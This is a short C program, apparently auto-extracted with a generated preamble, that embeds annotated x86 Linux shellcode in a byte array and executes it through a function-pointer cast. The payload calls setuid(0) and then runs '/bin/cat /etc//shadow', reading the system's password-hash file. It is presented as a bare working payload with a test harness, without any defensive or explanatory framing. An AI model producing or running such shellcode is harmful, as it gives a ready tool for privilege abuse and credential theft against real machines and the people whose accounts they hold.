#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  shellcode ;

/* Variables and functions */
 int /*<<< orphan*/  printf (char*,int) ; 
 void stub1 () ; 

int main()
{
	char shellcode[] = 
			"\x31\xdb"		// xor ebx,ebx
			"\x6a\x17"		// push byte 17h	
			"\x58"			// pop eax
			"\xcd\x80"		// int 0x80
			"\x8d\x43\x0b"		// lea eax,[ebx+0xb]
			"\x99"			// cdq
			"\x52"			// push edx
			"\x68\x2f\x63\x61\x74"	// push dword 0x7461632f
			"\x68\x2f\x62\x69\x6e"	// push dword 0x6e69622f
			"\x89\xe3"		// mov ebx,esp
			"\x52"			// push edx
			"\x68\x61\x64\x6f\x77"	// push dword 0x776f6461
			"\x68\x2f\x2f\x73\x68"	// push dword 0x68732f2f
			"\x68\x2f\x65\x74\x63"	// push dword 0x6374652f
			"\x89\xe1"		// mov ecx,esp
			"\x52"			// push edx
			"\x51"			// push ecx
			"\x53"			// push ebx
			"\x89\xe1"		// mov ecx,esp
			"\xcd\x80" ;		// int 80h

	printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
	(*(void(*)()) shellcode)();
	
	return 0;
}